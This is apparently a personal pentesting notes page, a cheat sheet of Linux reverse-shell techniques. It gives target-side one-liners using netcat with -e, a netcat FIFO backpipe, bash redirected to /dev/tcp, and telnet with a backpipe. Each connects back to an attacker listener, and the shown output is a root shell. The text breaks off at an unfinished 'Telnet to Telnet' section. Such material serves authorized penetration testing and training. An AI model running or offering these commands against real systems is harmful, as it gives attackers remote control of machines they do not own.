---
title: Linux Remote Shell Techniques
tags:
- linux
- pentesting
---

Abbreviations:

* AIP = Attacker's IP address
* APORT = Port of listening service on the attacker's machine
* TIP = Target's IP address
* TPORT = Target's port (most like a random number generated automatically)

## Standard Unsecure Netcat

This technique relies on a security feature being disabled when netcat was
compiled (that is the -e option).

Target:

```
[root@target ~]# nc <AIP> <APORT> -e /bin/bash
```

Attacker:

```
[root@attacker ~]# nc -n -vv -l -p <APORT>
listening on [any] <APORT> ...
connect to [<AIP> from (UNKNOWN) [TIP] [TPORT]
id
uid=0(root) gid=0(root) groups=0(root)
```

## Using Netcat with Security Hole Closed

is based on the common technique used to build netcat relays. When the
GAPING_SECURITY_HOLE is disabled, which means you don’t have access to the ‘-e’
option of netcat, most people pass on using netcat and move to something else.
Well this just isn’t necessary. Create a FIFO file system object and use it as
a backpipe to relay standard output from commands piped from netcat to
`/bin/bash` back into netcat.

Target:

```
[root@target ~]# mknod backpipe p && nc <AIP> <APORT> 0<backpipe | /bin/bash 1>backpipe
```

Attacker:

```
[root@attacker ~]# nc -n -vv -l -p <APORT>
listening on [any] <APORT> ...
connect to [<AIP> from (UNKNOWN) <TIP> <TPORT>
id
uid=0(root) gid=0(root) groups=0(root)
```

## Netcat Without Netcat

I love “hacks” that use features of the operating system against itself. This
is one of those “hacks”. It takes the /dev/tcp socket programming feature and
uses it to redirect /bin/bash to a remote system. It’s not always available,
but can be quite handy when it is.

Target:

```
[root@target ~]# /bin/bash -i > /dev/tcp/<AIP>/<APORT> 0<&1 2>&1
```

Attacker:

```
[root@attacker ~]# nc -n -vv -l -p <APORT>
listening on [any] <APORT> ...
connect to [<AIP> from (UNKNOWN) <TIP> <TPORT>
[root@target ~]# id
uid=0(root) gid=0(root) groups=0(root)
[root@target ~]#
```

## Netcat Without Netcat or /dev/tcp

For when `/dev/tcp` is not available either, combine it with the backpipes

Target:

```
[root@target ~]# mknod backpipe p && telnet <AIP> <APORT> 0<backpipe | /bin/bash 1>backpipe
```

Attacker:

```
[root@attacker ~]# nc -n -vv -l -p <APORT>
listening on [any] <APORT> ...
connect to [<AIP> from (UNKNOWN) [TIP] [TPORT]
id
uid=0(root) gid=0(root) groups=0(root)
```

## Telnet to Telnet

By god this is an ugly one... but it works... and if it's all you got then it's
all you got.

Target:
